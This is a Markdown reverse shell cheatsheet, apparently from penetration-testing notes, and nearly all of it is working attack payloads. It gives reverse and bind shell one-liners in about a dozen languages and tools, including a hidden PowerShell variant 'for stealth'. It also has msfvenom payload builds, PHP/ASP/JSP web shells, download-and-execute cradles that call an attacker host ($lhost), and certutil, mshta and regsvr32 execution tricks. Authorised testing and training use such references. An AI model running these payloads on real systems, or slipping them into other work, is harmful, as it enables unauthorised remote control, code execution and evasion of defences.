# Reverse Shell Cheatsheet

## References

- **Reverse Shell Generator**: <https://www.revshells.com> - Online generator with Base64 encoding, listener commands, and multiple payload types
- **PayloadsAllTheThings**: <https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md>
- **HackTricks**: <https://book.hacktricks.wiki/generic-methodologies-and-resources/reverse-shells/index.html>

---

## Table of Contents

- [Listener](#listener)
- [Bash](#bash)
- [Python](#python)
- [Perl](#perl)
- [PHP](#php)
- [Ruby](#ruby)
- [Netcat](#netcat)
- [PowerShell](#powershell)
- [Java](#java)
- [Lua](#lua)
- [NodeJS](#nodejs)
- [Groovy](#groovy)
- [Awk](#awk)
- [Socat](#socat)
- [Telnet](#telnet)
- [Msfvenom Payloads](#msfvenom-payloads)
- [Spawn TTY Shell](#spawn-tty-shell)
- [Shell Stabilization](#shell-stabilization)
- [Web Shells](#web-shells)
- [Bind Shell Techniques](#bind-shell-techniques)

---

## Listener

### Quick Check (One-liner)

```shell
# Quick reverse shell one-liner (bash)
rlwrap nc -lvnp $lport & echo "bash -i >& /dev/tcp/$lhost/$lport 0>&1" | base64
```

```shell
# Netcat
nc -lvnp $lport
rlwrap nc -lvnp $lport

# Socat
socat file:`tty`,raw,echo=0 TCP-L:$lport

# Metasploit
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x64/shell_reverse_tcp; set LHOST $lhost; set LPORT $lport; exploit -j"
```

---

## Bash

### TCP

```shell
bash -i >& /dev/tcp/$lhost/$lport 0>&1
```

```shell
bash -c 'bash -i >& /dev/tcp/$lhost/$lport 0>&1'
```

```shell
0<&196;exec 196<>/dev/tcp/$lhost/$lport; sh <&196 >&196 2>&196
```

```shell
/bin/bash -l > /dev/tcp/$lhost/$lport 0<&1 2>&1
```

### UDP

```shell
sh -i >& /dev/udp/$lhost/$lport 0>&1
```

### Bind Shell

```shell
# Victim
nc -lvp 4444 -e /bin/bash

# Attacker
nc $rhost 4444
```

---

## Python

### Python 3

```shell
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$lhost",$lport));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

### Python 2

```shell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$lhost",$lport));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### One-liner (No Spaces - URL Encoded)

```shell
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("$lhost",$lport));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'
```

### Windows Only

```shell
python -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('$lhost', $lport)), [[[(setattr(__g, 'data', s.recv(1024)), [[(s.send(subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE).communicate()[0])) for __g['s'] in [(s)]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0])[0] for __g['socket'] in [(__import__('socket', __g, __g))]][0])[0] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0])(globals(), __import__('contextlib')))"
```

---

## Perl

```shell
perl -e 'use Socket;$i="$lhost";$p=$lport;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

```shell
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"$lhost:$lport");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

### Perl Windows

```shell
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"$lhost:$lport");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

---

## PHP

```shell
php -r '$sock=fsockopen("$lhost",$lport);exec("/bin/sh -i <&3 >&3 2>&3");'
```

```shell
php -r '$sock=fsockopen("$lhost",$lport);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
```

```shell
php -r '$sock=fsockopen("$lhost",$lport);`/bin/sh -i <&3 >&3 2>&3`;'
```

```shell
php -r '$sock=fsockopen("$lhost",$lport);system("/bin/sh -i <&3 >&3 2>&3");'
```

```shell
php -r '$sock=fsockopen("$lhost",$lport);passthru("/bin/sh -i <&3 >&3 2>&3");'
```

```shell
php -r '$sock=fsockopen("$lhost",$lport);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
```

---

## Ruby

```shell
ruby -rsocket -e'f=TCPSocket.open("$lhost",$lport).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

```shell
ruby -rsocket -e'exit if fork;c=TCPSocket.new("$lhost","$lport");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"}'
```

### Ruby Windows

```shell
ruby -rsocket -e 'c=TCPSocket.new("$lhost","$lport");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

---

## Netcat

### Traditional

```shell
nc -e /bin/bash $lhost $lport
nc -e /bin/sh $lhost $lport
```

### OpenBSD (no -e)

```shell
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $lhost $lport >/tmp/f
```

### BusyBox

```shell
rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc $lhost $lport >/tmp/f
```

### Windows

```shell
nc.exe -e cmd.exe $lhost $lport
```

---

## PowerShell

### One-liner

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('$lhost',$lport);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### Hidden (for stealth)

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command $client = New-Object System.Net.Sockets.TCPClient("$lhost",$lport);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

### Base64 Encoded

```shell
# Generate payload
echo -n 'IEX(New-Object Net.WebClient).downloadString("http://$lhost/shell.ps1")' | iconv -t UTF-16LE | base64 -w 0

# Execute
powershell -enc <BASE64>
```

### Mini Reverse Shell (download and execute)

```powershell
powershell IEX (New-Object Net.WebClient).DownloadString('http://$lhost/Invoke-PowerShellTcp.ps1')
```

---

## Java

```java
Runtime r = Runtime.getRuntime();
Process p = r.exec("/bin/bash -c 'exec 5<>/dev/tcp/$lhost/$lport;cat <&5 | while read line; do $line 2>&5 >&5; done'");
p.waitFor();
```

### Java One-liner

```shell
r = Runtime.getRuntime(); p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/$lhost/$lport;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]); p.waitFor()
```

---

## Lua

### Linux Only

```shell
lua -e "require('socket');require('os');t=socket.tcp();t:connect('$lhost','$lport');os.execute('/bin/sh -i <&3 >&3 2>&3');"
```

### Windows & Linux

```shell
lua5.1 -e 'local host, port = "$lhost", $lport local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```

---

## NodeJS

```javascript
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect($lport, "$lhost", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/;
})();
```

### Short Version

```shell
require('child_process').exec('nc -e /bin/sh $lhost $lport')
```

```shell
var x = global.process.mainModule.require
x('child_process').exec('nc $lhost $lport -e /bin/bash')
```

---

## Groovy

```groovy
String host="$lhost";
int port=$lport;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};
p.destroy();s.close();
```

---

## Awk

```shell
awk 'BEGIN {s = "/inet/tcp/0/$lhost/$lport"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```

---

## Socat

### Attacker

```shell
socat file:`tty`,raw,echo=0 TCP-L:$lport
```

### Victim

```shell
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$lhost:$lport
```

### Download and Execute

```shell
wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$lhost:$lport
```

---

## Telnet

```shell
rm -f /tmp/p; mknod /tmp/p p && telnet $lhost $lport 0</tmp/p
```

```shell
telnet $lhost $lport | /bin/bash | telnet $lhost 4445
```

---

## Msfvenom Payloads

### Linux

```shell
# ELF Binary
msfvenom -p linux/x64/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f elf -o shell.elf

# Shellcode
msfvenom -p linux/x64/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f c
```

### Msfvenom Windows

```shell
# EXE Binary
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f exe -o shell.exe

# Meterpreter
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f exe -o meterpreter.exe

# PowerShell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f psh -o shell.ps1

# DLL
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f dll -o shell.dll
```

### Web Payloads

```shell
# PHP
msfvenom -p php/reverse_php LHOST=$lhost LPORT=$lport -f raw -o shell.php

# JSP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$lhost LPORT=$lport -f raw -o shell.jsp

# WAR
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$lhost LPORT=$lport -f war -o shell.war

# ASP
msfvenom -p windows/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f asp -o shell.asp

# ASPX
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f aspx -o shell.aspx
```

---

## Spawn TTY Shell

```shell
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

```shell
echo os.system('/bin/bash')
```

```shell
/bin/sh -i
```

```shell
perl -e 'exec "/bin/sh";'
```

```shell
ruby -e 'exec "/bin/sh"'
```

```shell
lua -e "os.execute('/bin/sh')"
```

### From nmap

```shell
!sh
```

### From vi/vim

```shell
:!bash
:set shell=/bin/bash:shell
```

### From script

```shell
script /dev/null -c bash
```

---

## Shell Stabilization

### Method 1: Python PTY

```shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### Method 2: Full TTY

```shell
# In reverse shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
Ctrl+Z

# In your terminal
stty raw -echo; fg

# Back in reverse shell
reset
export SHELL=bash
export TERM=xterm-256color
stty rows <NUM> cols <NUM>
```

### Method 3: Socat

```shell
# Attacker
socat file:`tty`,raw,echo=0 tcp-listen:$lport

# Victim
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$lhost:$lport
```

### Method 4: Script

```shell
script /dev/null -c bash
```

---

## Web Shells

### Web Shell PHP

```php
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>
<?php echo passthru($_GET['cmd']); ?>
<?php echo `$_GET['cmd']`; ?>
```

### ASP

```asp
<% eval request("cmd") %>
```

### JSP

```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

---

## Quick Reference

| Language | One-liner |
| ---------- | ----------- |
| Bash | `bash -i >& /dev/tcp/$lhost/$lport 0>&1` |
| Python | `python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("$lhost",$lport));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'` |
| PHP | `php -r '$sock=fsockopen("$lhost",$lport);exec("/bin/sh -i <&3 >&3 2>&3");'` |
| Perl | `perl -e 'use Socket;$i="$lhost";$p=$lport;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'` |
| Ruby | `ruby -rsocket -e'f=TCPSocket.open("$lhost",$lport).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'` |
| Netcat | `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2>&1\|nc $lhost $lport >/tmp/f` |
| Curl | `curl http://$lhost/shell.sh\|bash` |
| Wget | `wget -qO- http://$lhost/shell.sh\|bash` |
| Busybox | `busybox nc $lhost $lport -e /bin/sh` |
| OpenSSL | `mkfifo /tmp/s;/bin/sh -i</tmp/s 2>&1\|openssl s_client -connect $lhost:$lport>/tmp/s;rm /tmp/s` |

---

## Extra One-liners

### Curl/Wget Download & Execute

```shell
# Curl pipe to bash
curl http://$lhost/shell.sh | bash
curl -s http://$lhost/shell.sh | sh

# Wget pipe to bash  
wget -qO- http://$lhost/shell.sh | bash
wget http://$lhost/shell.sh -O /tmp/shell.sh && chmod +x /tmp/shell.sh && /tmp/shell.sh
```

### Busybox (Minimal Linux)

```shell
busybox nc $lhost $lport -e /bin/sh
busybox nc -e /bin/sh $lhost $lport
```

### OpenSSL Encrypted Reverse Shell

```shell
# Attacker (generate cert first)
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
openssl s_server -quiet -key key.pem -cert cert.pem -port $lport

# Victim
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect $lhost:$lport > /tmp/s; rm /tmp/s
```

### AWK Reverse Shell

```shell
awk 'BEGIN {s = "/inet/tcp/0/$lhost/$lport"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```

### PowerShell Download Cradles

```powershell
# IEX DownloadString
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://$lhost/shell.ps1')"

# IEX with Invoke-WebRequest
powershell -ep bypass -c "IEX(iwr http://$lhost/shell.ps1 -UseBasicParsing)"

# Certutil download and execute
certutil -urlcache -split -f http://$lhost/shell.exe C:\Windows\Temp\shell.exe && C:\Windows\Temp\shell.exe

# Bitsadmin
bitsadmin /transfer job /download /priority high http://$lhost/shell.exe C:\Windows\Temp\shell.exe && C:\Windows\Temp\shell.exe

# PowerShell Base64 encoded command
powershell -enc <BASE64_COMMAND>

# Conpty Shell (fully interactive)
IEX(IWR http://$lhost/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell $lhost $lport
```

### Windows One-liner (CMD)

```cmd
:: Certutil download
certutil -urlcache -split -f http://$lhost/nc.exe nc.exe && nc.exe $lhost $lport -e cmd.exe

:: PowerShell reverse shell (base64)
powershell -nop -w hidden -e <BASE64>

:: MSHTA execution
mshta http://$lhost/shell.hta

:: Regsvr32 (AppLocker bypass)
regsvr32 /s /n /u /i:http://$lhost/shell.sct scrobj.dll
```

### Golang Reverse Shell (Compile on attacker)

```shell
# Compile for Linux
CGO_ENABLED=0 GOOS=linux go build -o shell -ldflags "-s -w" shell.go

# Compile for Windows
CGO_ENABLED=0 GOOS=windows go build -o shell.exe -ldflags "-s -w" shell.go
```

---

## Bind Shell Techniques

> Target listens on a port, attacker connects to it

### Bash Bind Shell

```shell
# Target (listening)
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -lvp $lport > /tmp/f
```

### Netcat Bind Shell

```shell
# Target (Linux)
nc -lvnp $lport -e /bin/bash
nc -lvnp $lport -e /bin/sh

# Target (Windows)
nc.exe -lvnp $lport -e cmd.exe

# Netcat without -e (OpenBSD version)
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc -l $lport > /tmp/f
```

### Python Bind Shell

```python
# Target (save as bind.py and run)
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.bind(("0.0.0.0",$lport))
s.listen(1)
conn,addr=s.accept()
os.dup2(conn.fileno(),0)
os.dup2(conn.fileno(),1)
os.dup2(conn.fileno(),2)
subprocess.call(["/bin/sh","-i"])
```

```shell
# Python one-liner
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("0.0.0.0",$lport));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

### PHP Bind Shell

```php
<?php
$sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
socket_bind($sock, "0.0.0.0", $lport);
socket_listen($sock, 1);
$client = socket_accept($sock);
while(1){
    $cmd = socket_read($client, 1024);
    $output = shell_exec($cmd);
    socket_write($client, $output, strlen($output));
}
?>
```

### Perl Bind Shell

```perl
perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));bind(S,sockaddr_in($lport,INADDR_ANY));listen(S,1);accept(C,S);open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("/bin/sh -i");'
```

### Socat Bind Shell

```shell
# Target
socat TCP-LISTEN:$lport,reuseaddr,fork EXEC:/bin/bash

# Attacker connect
socat - TCP:$rhost:$lport
```

### PowerShell Bind Shell

```powershell
# Target (Windows)
$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',$lport);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()
```

### Attacker Connect to Bind Shell

```shell
# From attacker machine
nc -nv $rhost $lport

# With Socat
socat - TCP:$rhost:$lport
```

---

## 📚 See Also

### Related Command Guides

- **[Linux Command](6.2.Linux-command.md)** - Linux enumeration and system commands
- **[Windows Command](6.1.Windows-command.md)** - Windows enumeration and system commands
- **[Wordlist Guide](6.4.Wordlist-Guide.md)** - Wordlists for brute forcing

### Privilege Escalation (After Shell Access)

- **[Privilege Escalation Linux](../4.Privilege-Escalation/4.2.Privilege-Escalation-Linux.md)** - Linux privesc methodology
- **[Privilege Escalation Windows](../4.Privilege-Escalation/4.1.Privilege-Escalation-Windows.md)** - Windows privesc methodology
- **[GTFOBins Linux](../4.Privilege-Escalation/4.3.GTFOBins-Linux.md)** - SUDO/SUID abuse

### Web Exploitation

- **[Command Injection](../7.Web-Exploit/7.4.Command-Injection.md)** - Web-based command execution
- **[File Upload](../7.Web-Exploit/7.8.File-Upload.md)** - Web shell upload attacks
